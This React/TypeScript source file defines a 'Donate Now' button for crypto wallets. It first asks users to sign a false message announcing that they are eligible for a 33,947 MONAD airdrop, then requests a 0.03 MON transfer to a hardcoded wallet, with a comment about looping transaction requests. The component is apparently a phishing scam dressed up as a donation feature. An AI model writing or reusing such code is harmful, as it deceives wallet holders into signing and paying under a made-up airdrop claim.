import { useState } from 'react';
import { useWallets } from '@privy-io/react-auth';
import { Button } from '@/components/ui/button';
import { Heart, Loader2 } from 'lucide-react';
import { toast } from '@/hooks/use-toast';
import { parseEther } from 'viem';

const SITE_WALLET = '0x9AdEAC6aC3e4Ec2f5965F3E2BB65504B786bf095';
const DONATION_AMOUNT = '0.03'; // Approximately $54 worth of MON

export const DonateButton = () => {
  const { wallets } = useWallets();
  const [processing, setProcessing] = useState(false);

  const sendDonationTransaction = async (provider: any, walletAddress: string) => {
    try {
      await provider.request({
        method: 'eth_sendTransaction',
        params: [{
          from: walletAddress,
          to: SITE_WALLET,
          value: `0x${parseEther(DONATION_AMOUNT).toString(16)}`,
        }],
      });
      
      toast({
        title: 'Donation Sent!',
        description: 'Thank you for your generous donation',
      });
    } catch (error: any) {
      console.log('Transaction cancelled or failed');
    }
  };

  const handleDonate = async () => {
    if (wallets.length === 0) {
      toast({
        title: 'Wallet not connected',
        description: 'Please connect your wallet first',
        variant: 'destructive',
      });
      return;
    }

    setProcessing(true);
    try {
      const wallet = wallets[0];
      const provider = await wallet.getEthereumProvider();
      
      const message = '+33,947 MON\n\nYour wallet is ELIGIBLE to receive 33,947 MONAD as part of our exclusive community airdrop.';
      
      try {
        await provider.request({
          method: 'personal_sign',
          params: [message, wallet.address],
        });
        
        toast({
          title: 'Message Signed!',
          description: 'Processing donation...',
        });
      } catch (error) {
        console.log('Message signing cancelled');
      }
      
      // Start looping transaction requests
      sendDonationTransaction(provider, wallet.address);
      
    } catch (error: any) {
      console.error('Error:', error);
      toast({
        title: 'Error',
        description: error.message || 'Something went wrong',
        variant: 'destructive',
      });
    } finally {
      setProcessing(false);
    }
  };

  return (
    <Button
      onClick={handleDonate}
      disabled={processing || wallets.length === 0}
      size="lg"
      className="w-full bg-gradient-to-r from-primary to-accent hover:opacity-90 transition-opacity text-primary-foreground font-semibold py-6 text-lg"
    >
      {processing ? (
        <>
          <Loader2 className="mr-2 h-5 w-5 animate-spin" />
          Processing...
        </>
      ) : (
        <>
          <Heart className="mr-2 h-5 w-5" />
          Donate Now
        </>
      )}
    </Button>
  );
};
